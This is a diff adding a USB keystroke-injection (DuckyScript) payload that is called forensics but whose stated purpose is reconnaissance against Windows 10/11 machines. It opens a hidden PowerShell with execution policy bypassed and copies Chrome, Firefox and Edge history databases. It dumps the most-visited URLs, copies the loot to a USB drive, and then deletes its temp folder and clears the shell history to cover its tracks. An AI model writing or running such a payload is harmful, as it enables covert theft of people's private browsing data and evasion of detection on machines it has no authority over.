@@ -1,0 +1,65 @@
+# ============================================
+# BROWSER HISTORY EXTRACTION - Forensics
+# ============================================
+# Purpose: Extract browser history for recon
+# Target: Windows 10/11
+# Time: 15 seconds
+# Author: D3n14l0f53rv1c3
+# ============================================
+
+DELAY 2000
+
+GUI r
+DELAY 500
+STRING powershell -WindowStyle Hidden -ExecutionPolicy Bypass
+ENTER
+DELAY 3000
+
+STRING $td = "$env:TEMP\.history"; md $td -Force
+ENTER
+DELAY 200
+
+# Chrome History
+STRING $ch = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\History"
+ENTER
+STRING if (Test-Path $ch) { Copy-Item $ch "$td\chrome_history.db" -Force }
+ENTER
+DELAY 300
+
+# Firefox History
+STRING $ff = "$env:APPDATA\Mozilla\Firefox\Profiles\*.default\places.sqlite"
+ENTER
+STRING Copy-Item $ff "$td\firefox_history.db" -Force -ErrorAction SilentlyContinue
+ENTER
+DELAY 300
+
+# Edge History
+STRING $ed = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\History"
+ENTER
+STRING if (Test-Path $ed) { Copy-Item $ed "$td\edge_history.db" -Force }
+ENTER
+DELAY 300
+
+# Parse Chrome history (top 100 URLs)
+STRING $hist = "$td\history_export.txt"
+ENTER
+STRING "=== CHROME HISTORY ===" | Out-File $hist
+ENTER
+STRING if (Test-Path "$td\chrome_history.db") {
+ENTER
+STRING   sqlite3 "$td\chrome_history.db" "SELECT url, title, visit_count FROM urls ORDER BY visit_count DESC LIMIT 100" 2>$null | Out-File $hist -Append
+ENTER
+STRING }
+ENTER
+DELAY 500
+
+# Copy to USB
+STRING if (Test-Path E:\) { Copy-Item "$td\*" "E:\history\" -Force }
+ENTER
+DELAY 300
+
+# Clean
+STRING Remove-Item $td -Recurse -Force -ErrorAction SilentlyContinue
+ENTER
+STRING Clear-History; exit
+ENTER
